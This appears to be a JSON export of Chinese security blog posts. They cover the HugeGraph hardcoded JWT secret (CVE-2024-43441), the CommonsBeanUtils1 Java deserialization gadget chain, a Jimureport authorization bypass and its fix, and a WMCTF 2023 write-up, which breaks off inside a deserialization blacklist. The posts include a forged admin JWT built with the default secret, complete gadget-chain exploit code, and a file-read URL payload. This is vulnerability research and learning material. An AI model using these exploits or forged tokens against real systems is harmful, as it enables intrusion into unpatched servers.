[{"title":"Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)","url":"/2025/03/03/Apache%20HugeGraph%20JWT%20Token%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-43441)/","content":"漏洞成因及利用条件用户启用了认证但未配置auth.token_secret时，HugeGraph将使用一个硬编码的默认JWT密匙，默认密匙可以在官方文档中看到，其值为_FXQXbJtbCLxODc6tGci732pkH1cyf8Qg_。\nJWT构造规则分析因为代码文件太多了，所以找JWT构造规则的时候会比较困难，所以，可以想到哪里会利用JWT的构造，就是登录的时候。\n先找到LoginAPI，其中登录的部分\n看到token构造的代码在这段里。\ntry &#123;      String token = manager.authManager().loginUser(jsonLogin.name, jsonLogin.password);      HugeGraph g = graph(manager, graph);      return manager.serializer(g).writeMap(ImmutableMap.of(&quot;token&quot;, token));&#125;\n\n然后可以跟进到GraphManager的authManager()方法中\npublic AuthManager authManager() &#123;      return this.authenticator().authManager();  &#125;\n\n可以发现没有我们需要的信息，并且返回一堆函数的调用，所以继续跟进到authenticator()\nprivate HugeAuthenticator authenticator() &#123;      E.checkState(this.authenticator != null,                   &quot;Unconfigured authenticator, please config &quot; +                   &quot;auth.authenticator option in rest-server.properties&quot;);      return this.authenticator;  &#125;\n\n该方法只是检查this.authenticator是否为空，如果为空就会抛出异常，不为空就重新返回authenticator。\n所以跟进authManager().loginUser方法，在src&#x2F;main&#x2F;resources &#x2F;StandardAuthManager.java中。\n\npublic String loginUser(String username, String password)          throws AuthenticationException &#123;      HugeUser user = this.matchUser(username, password);      if (user == null) &#123;          String msg = &quot;Incorrect username or password&quot;;          throw new AuthenticationException(msg);      &#125;        Map&lt;String, ?&gt; payload = ImmutableMap.of(AuthConstant.TOKEN_USER_NAME,                                               username,                                               AuthConstant.TOKEN_USER_ID,                                               user.id.asString());      String token = this.tokenGenerator.create(payload, this.tokenExpire);        this.tokenCache.update(IdGenerator.of(token), username);      return token;  &#125;\n\n这段代码可以发现构造JWT中需要的一部分参数，AuthConstant.TOKEN_USER_NAME_以及_AuthConstant.TOKEN_USER_ID_，进入AuthConstant接口，可以发现这俩个参数就是_user_name_以及_user_id_，还有一个_tokenExpire 参数，不确定是有什么作用。\n\n继续跟进tokenGenerator.create，找到auth&#x2F;TokenGenerator.java文件\n\npublic String create(Map&lt;String, ?&gt; payload, long expire) &#123;      return Jwts.builder()                 .setClaims(payload)                 .setExpiration(new Date(System.currentTimeMillis() + expire))                 .signWith(this.key, SignatureAlgorithm.HS256)                 .compact();  &#125;\n\n进而发现构造jwt的参数所需的全部条件。\nToken构造分析用于用户认证的代码主要位于_org&#x2F;apache&#x2F;hugegraph&#x2F;api&#x2F;filter&#x2F;AuthenticationFilter.java_中的authenticate方法\nprotected User authenticate(ContainerRequestContext context) &#123;      GraphManager manager = this.managerProvider.get();      E.checkState(manager != null, &quot;Context GraphManager is absent&quot;);        if (!manager.requireAuthentication()) &#123;          // Return anonymous user with an admin role if disable authentication          return User.ANONYMOUS;      &#125;        // Get peer info      Request request = this.requestProvider.get();      String peer = null;      String path = null;      if (request != null) &#123;          peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort();          path = request.getRequestURI();      &#125;        // Check whiteIp      if (enabledWhiteIpCheck == null) &#123;          String whiteIpStatus = this.configProvider.get().get(WHITE_IP_STATUS);          enabledWhiteIpCheck = Objects.equals(whiteIpStatus, STRING_ENABLE);      &#125;        if (enabledWhiteIpCheck &amp;&amp; request != null) &#123;          peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort();          path = request.getRequestURI();            String remoteIp = request.getRemoteAddr();          Set&lt;String&gt; whiteIpList = manager.authManager().listWhiteIPs();          boolean whiteIpEnabled = manager.authManager().getWhiteIpStatus();          if (!path.contains(STRING_WHITE_IP_LIST) &amp;&amp; whiteIpEnabled &amp;&amp;              !whiteIpList.contains(remoteIp)) &#123;              throw new ForbiddenException(String.format(&quot;Remote ip &#x27;%s&#x27; is not permitted&quot;,                                                         remoteIp));          &#125;      &#125;        Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;();      // Extract authentication credentials      String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);      if (auth == null) &#123;          throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;,                                           &quot;Missing authentication credentials&quot;);      &#125;        if (auth.startsWith(BASIC_AUTH_PREFIX)) &#123;          auth = auth.substring(BASIC_AUTH_PREFIX.length());          auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET);          String[] values = auth.split(&quot;:&quot;);          if (values.length != 2) &#123;              throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);          &#125;            final String username = values[0];          final String password = values[1];            if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) &#123;              throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);          &#125;            credentials.put(HugeAuthenticator.KEY_USERNAME, username);          credentials.put(HugeAuthenticator.KEY_PASSWORD, password);      &#125; else if (auth.startsWith(BEARER_TOKEN_PREFIX)) &#123;          String token = auth.substring(BEARER_TOKEN_PREFIX.length());          credentials.put(HugeAuthenticator.KEY_TOKEN, token);      &#125; else &#123;          throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;);      &#125;        credentials.put(HugeAuthenticator.KEY_ADDRESS, peer);      credentials.put(HugeAuthenticator.KEY_PATH, path);        // Validate the extracted credentials      try &#123;          return manager.authenticate(credentials);      &#125; catch (AuthenticationException e) &#123;          throw new NotAuthorizedException(&quot;Authentication failed&quot;, e.getMessage());      &#125;  &#125;\n\n首先，是Http头的限制\nMap&lt;String, String&gt; credentials = new HashMap&lt;&gt;();  // Extract authentication credentials  String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);if (auth == null) &#123;      throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;,                                       &quot;Missing authentication credentials&quot;);  &#125;\n\n这里从AUTHORIZATION中拿出Token，限制了Http头要为AUTHORIZATION并且不为空。\n然后开始判断token的开头\nif (auth.startsWith(BASIC_AUTH_PREFIX)) &#123;      auth = auth.substring(BASIC_AUTH_PREFIX.length());      auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET);      String[] values = auth.split(&quot;:&quot;);      if (values.length != 2) &#123;          throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);      &#125;        final String username = values[0];      final String password = values[1];        if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) &#123;          throw new BadRequestException(&quot;Invalid syntax for username and password&quot;);      &#125;        credentials.put(HugeAuthenticator.KEY_USERNAME, username);      credentials.put(HugeAuthenticator.KEY_PASSWORD, password);  &#125; else if (auth.startsWith(BEARER_TOKEN_PREFIX)) &#123;      String token = auth.substring(BEARER_TOKEN_PREFIX.length());      credentials.put(HugeAuthenticator.KEY_TOKEN, token);  &#125; else &#123;      throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;);  &#125;\n\n首先第一个if判断Authorization 头是否为Basic，如果为Basic就进行账号密码的原始字符串判断，所以开头不能为base。\n第二种判断Authorization 头是否为Bearer，这种就是可以利用的JWT认证。\n漏洞复现使用默认密匙构造jwt\n按分析构造token\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiJhZG1pbiIsImV4cCI6OTczOTUyNDU2N30.Kc_6-EtUz3J8lS9VZEfsEe4BFYz-GIg7SFFfGQ5VNeE\n\n无token时,返回报错json\n加入构造token。\n!\n","categories":["代码审计"],"tags":["java，代码审计"]},{"title":"CommonsBeanUtils1","url":"/2025/03/19/CommonsBeanUtils1/","content":"CommonsBeanUtils介绍CommonsBeanUtils是Apache Commons中的一个组件，主要用于处理JavaBean的操作。 它提供了一系列工具类和方法，帮助开发者动态地获取和设置JavaBean的属性，简化了编程工作‌\n首先是功能方面：\n\n属性操作：提供了PropertyUtiles类，可以动态的获取和设置javaBean的属性，例如PropertyUtils.getProperty(object, &quot;property&quot;)可以调用对象的getter方法，获取属性值‌。\n类型转化：提供类型转化工具，如ConvertUtils，可以将一种类型的对象转换成另一种类型。\n比较器：BeanComparator类实现了Comparator接口，用于在集合中对javaBean对象进行排序\n\njavaBean介绍上面提到了javaBean对象，那么javaBean对象是什么呢？\njavaBean是一种java的软件组件模型， 它通过封装属性和方法成为具有某种功能或处理某个业务的对象。\n我理解起来就是，在一个public的java类中，有无参的构造函数，并且存在一个或者多个private的属性，而且提供了公开的get&#x2F;set方法的类就是javaBean。也就是下面三个要素\n\n该java类是公共的并且具有无参构造函数\n存在一个或者多个私有的属性\n有公开的getter与setter方法。\n\n使用CommonsBeanUtils进行调用javaBean事例及源码调试cat.java\npackage org.example;public class cat &#123;    private String name = &quot;follycat&quot;;    public cat()&#123;&#125;    public String getName()&#123;        return name;    &#125;&#125;\n\nmain.java\npackage org.example;import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.Constructor;import java.lang.reflect.Field;public class Main &#123;    public static void main(String[] args) throws Throwable &#123;        cat cat = new cat();        System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));    &#125;&#125;\n\n调用过后可以直接输出name的值，因为可以直接找到cat类中name的get方法。\n可以进行调试一下，来看commonsBeanUtils是怎么进行调用name类的get方法的。\n首先进入.getProperty，\n\n现在可以看到参数bean是cat类，name参数还是name。\n然后继续步入，走到PropertyUitlsBean中的getProperty方法。\n主要是这一段\nwhile (resolver.hasNested(name)) &#123;    String next = resolver.next(name);    Object nestedBean = null;    if (bean instanceof Map) &#123;        nestedBean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, next);    &#125; else if (resolver.isMapped(next)) &#123;        nestedBean = getMappedProperty(bean, next);    &#125; else if (resolver.isIndexed(next)) &#123;        nestedBean = getIndexedProperty(bean, next);    &#125; else &#123;        nestedBean = getSimpleProperty(bean, next);    &#125;    if (nestedBean == null) &#123;        throw new NestedNullException                (&quot;Null property value for &#x27;&quot; + name +                &quot;&#x27; on bean class &#x27;&quot; + bean.getClass() + &quot;&#x27;&quot;);    &#125;    bean = nestedBean;    name = resolver.remove(name);&#125;if (bean instanceof Map) &#123;    bean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, name);&#125; else if (resolver.isMapped(name)) &#123;    bean = getMappedProperty(bean, name);&#125; else if (resolver.isIndexed(name)) &#123;    bean = getIndexedProperty(bean, name);&#125; else &#123;    bean = getSimpleProperty(bean, name);&#125;return bean;\n\n调试之后可以发现while(resolver.hasNested(name))是直接为false的，没有进入while循环中，然后因为bean不为map，引索，以及映射的属性，于是就进入了getSimpleProperty中\n继续跟进到getSimpleProperty中，然后看到getPropertyDescriptor\n\n其实可以看到在invokeMethod之前的readMethod中已经被赋值为了getName。\n差不多是在这里\n\n其中的getPropertyDescriptors() 方法用于获取类的所有属性的描述符。每个 PropertyDescriptor 提供了有关该属性的详细信息，包括其名称、getter 方法、setter 方法等。\n也就是这里的信息开始有了getName方法\n\n然后返回到getDescriptor中对获取到的getName以及其他方法进行遍历，最后返回我们所需要的那个类。\n\n最后在这里的InvokeMethod进行执行。\n\n跟进之后可以看到\n\n最后返回的value就是执行后的getName的返回值了。\n\n链子分析尾部既然已经知道了CommonsBeanUtils是如何调用getter方法的，现在就可以利用他进行调用任意getter方法了。\n可以看到cc3的链子，这条链子之前我自己分析的时候只分析到了newTransformer方法，然后直接使用cc1中的InvokeTransformer的后半条链进行调用了他的newTransformer，这里可以继续往下面分析。\n现在如果有一个getter方法调用了TemplatesImpl的newTransform方法，我们就可以通过PropertyUtils.getProperty调用getter方法，然后使用动态加载 TemplatesImpl 字节码的方式进行攻击的。\n这个getter方法就是getOutputProperties，他就在newTransform的下面，并且他完全符合PropertyUtils.getProperty的调用方式。\npublic synchronized Properties getOutputProperties() &#123;    try &#123;        return newTransformer().getOutputProperties();    &#125;    catch (TransformerConfigurationException e) &#123;        return null;    &#125;&#125;\n\n所以这条链子的尾部就已经完成了，就是使用PropertyUtils.getProperty调用TemplatesImpl的getOutputProperties方法，然后进行动态字节码加载执行代码\n测试代码:\npackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class CommonsBeanUtils1 &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc=templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates,codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates,new TransformerFactoryImpl());        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));    &#125;&#125;\n\n成功弹出计算器。\n中间与前半部分现在就是要从PropertyUtils.getProperty出发，继续寻找调用了他的链子。\n可以找到BeanComparetor的compare方法，这里调用了PropertyUtils.getProperty\n\n测试代码\npackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CommonsBeanUtils1 &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc=templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates,codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates,new TransformerFactoryImpl());//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);        beanComparator.compare(templates,templates);    &#125;&#125;\n\n成功弹出计算器\n随后继续查找有谁调用了compare，看到PriorityQueue 这个类中的siftDownUsingComparator() 方法。这个方法调用了compare()\n其实这前半部分和cc4中的前半段是一样的。\nexppackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.beanutils.PropertyUtils;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CommonsBeanUtils1 &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc=templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates,codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates,new TransformerFactoryImpl());//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);//        beanComparator.compare(templates,templates);        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);        priorityQueue.add(templates);        priorityQueue.add(2);        Class c = priorityQueue.getClass();        Field field = c.getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(priorityQueue,beanComparator);        serialize(priorityQueue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;","categories":["java反序列化"],"tags":["java反序列化"]},{"title":"Jimureport1.7.8越权漏洞代码分析及修复代码分析(CVE-2024-44893)","url":"/2025/03/25/Jimureport1.7.8%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-44893)/","content":"漏洞代码分析及漏洞成因漏洞成因拦截器中对于Token验证的代码中存在逻辑漏洞。\n漏洞代码分析首先，这个项目使用了Spring MVC的拦截器。\n可以找到拦截器的代码段位于这个项目的jimureport-spring-boot-starter.jar中的org.jeecg.modules.jmreport.config.firewall.interceptor.JimuReportTokenInterceptor包。\n以下是preHandle拦截器的代码\npublic boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;    if (!(handler instanceof HandlerMethod)) &#123;        return true;    &#125; else &#123;        String var4 = d.i(request.getRequestURI().substring(request.getContextPath().length()));        log.debug(&quot;JimuReportInterceptor check requestPath = &quot; + var4);        int var5 = 500;        if (n.a(var4)) &#123;            log.error(&quot;请注意，请求地址有xss攻击风险！&quot; + var4);            this.backError(response, &quot;请求地址有xss攻击风险!&quot;, var5);            return false;        &#125; else &#123;            String var6 = this.jmBaseConfig.getCustomPrePath();            log.debug(&quot;customPrePath: &#123;&#125;&quot;, var6);            if (j.d(var6) &amp;&amp; !var6.startsWith(&quot;/&quot;)) &#123;                var6 = &quot;/&quot; + var6;            &#125;            request.setAttribute(&quot;customPrePath&quot;, var6);            HandlerMethod var7 = (HandlerMethod)handler;            Method var8 = var7.getMethod();            if (var4.contains(&quot;/jmreport/shareView/&quot;)) &#123;                return true;            &#125; else &#123;                JimuNoLoginRequired var9 = (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);                if (j.d(var9)) &#123;                    return true;                &#125; else &#123;                    boolean var10 = false;                    try &#123;                        var10 = this.verifyToken(request);                    &#125; catch (Exception var14) &#123;                    &#125;                    if (!var10) &#123;                        if (this.jimuReportShareService.isSharingEffective(var4, request)) &#123;                            return true;                        &#125; else &#123;                            String var16 = request.getParameter(&quot;previousPage&quot;);                            if (j.d(var16)) &#123;                                if (this.jimuReportShareService.isShareingToken(var4, request)) &#123;                                    return true;                                &#125; else &#123;                                    log.error(&quot;分享链接失效或分享token不匹配(&quot; + request.getMethod() + &quot;)：&quot; + var4);                                    this.backError(response, &quot;分享链接失效或分享token不匹配，禁止钻取!&quot;, var5);                                    return false;                                &#125;                            &#125; else &#123;                                log.error(&quot;Token校验失败！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);                                this.backError(response, &quot;Token校验失败，无权限访问！&quot;, var5);                                return false;                            &#125;                        &#125;                    &#125; else &#123;                        b var15 = (b)var8.getAnnotation(b.class);                        if (var15 != null) &#123;                            String[] var11 = var15.a();                            String[] var12 = this.jimuTokenClient.getRoles(request);                            if (var12 == null || var12.length == 0) &#123;                                log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);                                if (&quot;/jmreport/loadTableData&quot;.equals(var4)) &#123;                                    var5 = GEN_TEST_DATA_CODE;                                &#125;                                this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);                                return false;                            &#125;                            boolean var13 = Arrays.stream(var12).anyMatch((code) -&gt; &#123;                                return j.a(code, var11);                            &#125;);                            if (!var13) &#123;                                log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);                                if (&quot;/jmreport/loadTableData&quot;.equals(var4)) &#123;                                    var5 = GEN_TEST_DATA_CODE;                                &#125;                                this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);                                return false;                            &#125;                        &#125;                        return true;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;\n\n漏洞代码位于为下面这段\n\n其中var10为检查用户是否登录的检测结果，如果没有登录就会进入下面的代码中。\n其中isSharingEffective是用于判断时间是否过期的代码，我们当前处于未登录状态，所以主要看else后面的代码段。\n首先从get中获取previousPage这个参数，并通过j.d这个方法进行校验。\npublic static String d(String var0) &#123;    byte var1 = 3;    if (var0.length() &lt; var1) &#123;        return var0.toLowerCase();    &#125; else &#123;        StringBuilder var2 = new StringBuilder(var0);        int var3 = 0;        for(int var4 = 2; var4 &lt; var0.length(); ++var4) &#123;            if (Character.isUpperCase(var0.charAt(var4))) &#123;                var2.insert(var4 + var3, &quot;_&quot;);                ++var3;            &#125;        &#125;        return var2.toString().toLowerCase();    &#125;&#125;\n\nj.d方法的这段代码主要用于字符串分割，小于3个长度的字符会转化为小写直接输出，大于3个长度的字符就会检测大写字符并加入_进行分割。\n所以只需要previousPage参数不为空即可。\n然后跟进到isShareingToken方法。\n这个方法位于org.jeecg.modules.jmreport.desreport.service.a.f中\n代码如下：\npublic boolean isShareingToken(String requestPath, HttpServletRequest request) &#123;    String var3 = request.getHeader(&quot;JmReport-Share-Token&quot;);    String var4 = &quot;&quot;;    if (j.c(var3)) &#123;        var3 = request.getParameter(&quot;shareToken&quot;);    &#125;    String var5 = request.getParameter(&quot;jmLink&quot;);    if (j.d(var5)) &#123;        try &#123;            byte[] var6 = Base64Utils.decodeFromString(var5);            String var7 = new String(var6);            String[] var8 = var7.split(&quot;\\\\|\\\\|&quot;);            if (ArrayUtils.isNotEmpty(var8) &amp;&amp; var8.length == 2) &#123;                var3 = var8[0];                var4 = var8[1];            &#125;        &#125; catch (IllegalArgumentException var9) &#123;            a.error(&quot;解密失败：&quot; + var9.getMessage());            a.error(var9.getMessage(), var9);            return false;        &#125;    &#125;    if (j.c(var3)) &#123;        return false;    &#125; else &#123;        JimuReportShare var10 = this.jimuReportShareDao.getShareByShareToken(var3);        if (var10 != null) &#123;            var10 = this.compareToDate(var10);            if (!&quot;0&quot;.equals(var10.getStatus())) &#123;                return false;            &#125;        &#125;        if (requestPath.startsWith(&quot;/jmreport/view&quot;)) &#123;            if (!j.d(var4)) &#123;                return false;            &#125;            Long var11 = this.jimuReportLinkDao.selectLinkCountByLinkId(var4);            if (null != var11 &amp;&amp; var11 &gt; 0L) &#123;                return true;            &#125;        &#125;        return true;    &#125;&#125;\n\n可以看到代码中先获取http头为JmReport-Share-Token的字符串，正常逻辑来说会判断其是否存在，如果不存在就获取名字为shareToken的参数。\n但是在j函数中，有俩个.c方法，一个接收值类型为字符串，另一个为Object。\n\n而var3类型就为String类型，所以会优先调用c(String var0)这个方法。\n这样漏洞就产生了，当JmReport-Share-Token有参数时，其也会获取shareToken的值，并赋值给var3参数，造成参数覆盖。\n并且当shareToken赋值为空时，并不会触发return false，会继续进入到else中，从而走到getShareByShareToken方法，\n\n这个方法用于查询数据库中是否存在 shareToken。\n如果shareToken查找结果为空，也就是var10为null时，由于没有对var10&#x3D;null的处理方法，并且这个函数默认返回true，从而达到权限绕过的漏洞\n\n漏洞修复代码分析可以下载一个1.8.0的代码进行对比，看看厂家是如何修复这个漏洞的。\n首先，他更改了j函数中的c方法，改为了OkConvertUtils.isEmpty\n\n点进去看源码，其实可以发现这个方法的代码很眼熟，就是原来j函数中的接收Object参数类型的c方法。\n\n然后，再往下看，可以看到下面的代码对var10=null的情况进行了处理，当var10=null时，使用了else将其返回值更改为false。\n\n","categories":["代码审计"],"tags":["java，代码审计"]},{"title":"WMCTF2023-ez_java_again(RMIConnector二次反序列化)","url":"/2025/05/30/WMCTF2023-ez_java_again(RMIConnector%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/","content":"环境搭建这里用的是CTF复现计划里的docker进行搭建的。\ndocker命令\ndocker run -it -d -p 12345:8080 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/wmctf2023_ezjavaagainrev\n\n\n访问12345端口即可\n\n解题首先看到题目中有一个按钮，点击后没啥反应，随后进行查看源代码以及抓包。\n\n\n抓包到了url参数，并且源码中有url1这个参数，并说明了有安全问题已经被废弃掉了。\n因此使用url1这个参数来进行文件读取。\n/Imagefile?url1=file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/ctf/help_me/%23java\n\n\n将这俩个文件夹里的文件都读取出来，这个环境里面的.class文件都可以直接读取然后直接放到idea里面查看源码。\n直接看他造成反序列化的CmdServlet.class这个类\n\n其中过滤在/WEB-INF/classes/config/serialkiller.xml中\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- serialkiller.conf --&gt;&lt;config&gt;    &lt;refresh&gt;6000&lt;/refresh&gt;    &lt;mode&gt;        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;        &lt;profiling&gt;false&lt;/profiling&gt;    &lt;/mode&gt;    &lt;logging&gt;        &lt;enabled&gt;false&lt;/enabled&gt;    &lt;/logging&gt;    &lt;blacklist&gt;        &lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload  --&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.Transformer$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InstantiateFactory$&lt;/regexp&gt;        &lt;regexp&gt;com\\.sun\\.org\\.apache\\.xalan\\.internal\\.xsltc\\.traxTrAXFilter$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functorsFactoryTransformer$&lt;/regexp&gt;        &lt;regexp&gt;javax\\.management\\.BadAttributeValueExpException$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.keyvalue\\.TiedMapEntry$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.ChainedTransformer$&lt;/regexp&gt;        &lt;regexp&gt;com\\.sun\\.org\\.apache\\.xalan\\.internal\\.xsltc\\.trax\\.TemplatesImpl$&lt;/regexp&gt;        &lt;regexp&gt;com\\.sun\\.org\\.apache\\.xalan\\.internal\\.xsltc\\.trax\\.TrAXFilter$&lt;/regexp&gt;        &lt;regexp&gt;java\\.security\\.SignedObject$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.Transformer$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InstantiateFactory$&lt;/regexp&gt;        &lt;regexp&gt;com\\.sun\\.org\\.apache\\.xalan\\.internal\\.xsltc\\.traxTrAXFilter$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functorsFactoryTransformer$&lt;/regexp&gt;        &lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload  --&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.beanutils\\.BeanComparator$&lt;/regexp&gt;        &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.Transformer$&lt;/regexp&gt;        &lt;regexp&gt;com\\.sun\\.rowset\\.JdbcRowSetImpl$&lt;/regexp&gt;        &lt;regexp&gt;java\\.rmi\\.registry\\.Registry$&lt;/regexp&gt;        &lt;regexp&gt;java\\.rmi\\.server\\.ObjID$&lt;/regexp&gt;        &lt;regexp&gt;java\\.rmi\\.server\\.RemoteObjectInvocationHandler$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.beans\\.factory\\.ObjectFactory$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.core\\.SerializableTypeWrapper\\$MethodInvokeTypeProvider$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.aop\\.framework\\.AdvisedSupport$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.aop\\.target\\.SingletonTargetSource$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.aop\\.framework\\.JdkDynamicAopProxy$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.core\\.SerializableTypeWrapper\\$TypeProvider$&lt;/regexp&gt;        &lt;regexp&gt;org\\.springframework\\.aop\\.framework\\.JdkDynamicAopProxy$&lt;/regexp&gt;        &lt;regexp&gt;java\\.util\\.PriorityQueue$&lt;/regexp&gt;        &lt;regexp&gt;java\\.lang\\.reflect\\.Proxy$&lt;/regexp&gt;        &lt;regexp&gt;javax\\.management\\.MBeanServerInvocationHandler$&lt;/regexp&gt;        &lt;regexp&gt;javax\\.management\\.openmbean\\.CompositeDataInvocationHandler$&lt;/regexp&gt;        &lt;regexp&gt;java\\.beans\\.EventHandler$&lt;/regexp&gt;        &lt;regexp&gt;java\\.util\\.Comparator$&lt;/regexp&gt;        &lt;regexp&gt;org\\.reflections\\.Reflections$&lt;/regexp&gt;    &lt;/blacklist&gt;    